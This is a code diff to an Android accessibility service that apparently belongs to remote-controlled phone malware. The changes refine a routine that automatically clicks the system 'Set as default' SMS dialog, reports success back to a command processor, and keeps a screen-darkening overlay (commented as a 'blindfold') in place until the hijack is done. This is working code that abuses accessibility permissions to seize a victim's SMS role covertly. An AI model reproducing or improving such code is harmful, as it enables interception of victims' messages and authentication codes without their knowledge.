@@ -1057,10 +1057,17 @@ class MyAccessibilityService : AccessibilityService() {
                     }
                     
                     if (clickedRadio) {
+                        // INSTANT LOCKOUT: Stop other rapid AccessibilityEvents from queueing multiple delayed tasks
+                        DefaultSmsManager.expectedMode = "AUTO_CONFIRMING" 
                         logThrottled("GHOST_SMS", "Waiting for 'Set as default' button...")
-                        // Small delay to allow radio state update
+                        
                         android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                            val rootDelay = rootInActiveWindow ?: return@postDelayed
+                            val rootDelay = rootInActiveWindow
+                            if (rootDelay == null) {
+                                DefaultSmsManager.expectedMode = "AUTO" // Re-arm if UI vanished
+                                return@postDelayed
+                            }
+                            
                             val setNodes = rootDelay.findAccessibilityNodeInfosByText("Set as default") + rootDelay.findAccessibilityNodeInfosByText("Set")
                             var btnClicked = false
                             for (btn in setNodes) {
@@ -1072,10 +1079,11 @@ class MyAccessibilityService : AccessibilityService() {
                                 }
                             }
                             if (!btnClicked) {
-                                DebugLogger.log("GHOST_SMS_LIFECYCLE", "Could not find clickable 'Set as default' button in hierarchy.")
+                                DebugLogger.log("GHOST_SMS_LIFECYCLE", "Could not find clickable 'Set as default' button. Re-arming for next event.")
+                                DefaultSmsManager.expectedMode = "AUTO" // Re-arm so it tries again on next screen update
                                 return@postDelayed
                             }
-                            DefaultSmsManager.expectedMode = "" // Disarm
+                            
                             CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", "Set as Default SMS via Ghost Hand")
                             
                             // Delay HOME slightly to ensure dialogs resolve and OS processes the action
@@ -1087,7 +1095,9 @@ class MyAccessibilityService : AccessibilityService() {
                             }, 600)
 
                             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                                DefaultSmsManager.expectedMode = "" // Fully disarm script
                                 DimmerManager.IgnitionManager.release(applicationContext, "SMS_GHOST")
+                                DimmerManager.removeOverlay(applicationContext) // CRITICAL: Drop the blindfold!
                                 DynamicUIManager.removeOverlay(this@MyAccessibilityService, "HIJACK_SUCCESS_HOME_ROUTED")
                             }, 2500)
                         }, 600)
